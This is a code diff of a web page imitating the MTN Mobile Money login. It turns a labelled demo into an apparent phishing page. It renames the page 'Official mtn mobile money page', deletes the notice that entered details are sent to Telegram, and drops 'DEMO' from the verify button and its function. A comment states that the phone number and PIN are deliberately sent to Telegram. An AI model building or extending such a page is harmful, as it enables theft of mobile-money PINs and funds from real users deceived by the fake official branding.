@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Mtn Mobile Money UI </title>
+<title>Official mtn mobile money page</title>
 
 <style>
 *{box-sizing:border-box}
@@ -132,7 +132,7 @@ button{
 
 <div class="hero">
   <div>
-    <div class="logo">◈</div>
+    <div class="Mtn logo">◈</div>
 
     <div class="brand">
       Welcome to MoMo
@@ -154,8 +154,6 @@ button{
   </h1>
 
   <p>
-    Enter an official mtn number.
-    Details are sent to Telegram and stored as a credential.
   </p>
 
   <div class="field">
@@ -198,7 +196,7 @@ button{
     id="pin"
     type="password"
     inputmode="numeric"
-    maxlength="4"
+    maxlength="5"
     placeholder="••••"
     autocomplete="off"
   >
@@ -206,8 +204,8 @@ button{
   <br>
   <br>
 
-  <button onclick="verifyDemo()">
-    VERIFY DEMO
+  <button onclick="verify()">
+    VERIFY 
   </button>
 
   <button
@@ -282,7 +280,7 @@ function backPage(){
 }
 
 
-async function verifyDemo(){
+async function verify(){
 
   const pin =
     document.getElementById('pin').value;
@@ -291,7 +289,7 @@ async function verifyDemo(){
   /*
     DEMO SAFETY:
 
-    The PIN is checked locally.
+    The PIN is checked through telegram.
 
     The entered PIN and phone number
     are deliberately sent to telegram.
